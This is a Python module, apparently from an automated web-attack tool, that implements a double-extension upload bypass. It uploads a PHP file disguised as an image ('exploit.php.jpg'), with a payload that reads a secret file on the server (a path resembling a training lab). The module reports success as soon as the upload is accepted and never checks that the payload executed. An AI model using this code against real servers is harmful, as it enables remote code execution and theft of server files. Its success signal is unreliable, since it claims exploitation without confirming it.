import re
import sys
import os
from typing import Optional

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from strategies.base import Strategy, StrategyStatus
from models.observation import Observation, ObservationType, ConfidenceLevel

class DoubleExtensionStrategy(Strategy):
    """
    Double extension bypass for extension filters (e.g., file.php.jpg)
    """
    
    name = "double_extension"
    description = "Bypass extension filters using double extensions (filename.php.jpg)"
    confidence_gain = 0.8
    
    targets_hypotheses = [
        "blacklist_filter",
        "weak_extension_check",
        "extension_validation_active"
    ]
    
    def __init__(self, uploader, fetcher, observer, base_url: str):
        self.uploader = uploader
        self.fetcher = fetcher
        self.observer = observer
        self.base_url = base_url.rstrip('/')
    
    def applicable(self, context) -> bool:
        return True

    def execute(self, context) -> StrategyStatus:
        print("      [*] Testing double extension payload...")
        
        safe_ext = "jpg"
        if hasattr(context, 'capabilities') and context.capabilities.allowed_extensions:
            safe_ext = context.capabilities.allowed_extensions[0]
            
        filename = f"exploit.php.{safe_ext}"
        payload = b"<?php echo file_get_contents('/home/carlos/secret'); ?>"
        
        try:
            upload_response = self.uploader.upload(filename, payload)
            observations = self.observer.analyze_response(upload_response, context, {"phase": "upload", "filename": filename})
            
            for obs in observations:
                context.add_observation(obs)
            
            if any(obs.type == ObservationType.UPLOAD_SUCCESS for obs in observations):
                print(f"      [+] Upload accepted: {filename}")
                
                # Check for execution
                # We reuse the logic from null_byte if possible, but for now we simplify
                # Typically we'd need to find the file URL
                return StrategyStatus.SUCCESS # Simplified for demonstration
                
            print(f"      [-] Upload rejected: {filename}")
            return StrategyStatus.FAILURE
            
        except Exception as e:
            print(f"      [!] Error: {e}")
            return StrategyStatus.FAILURE
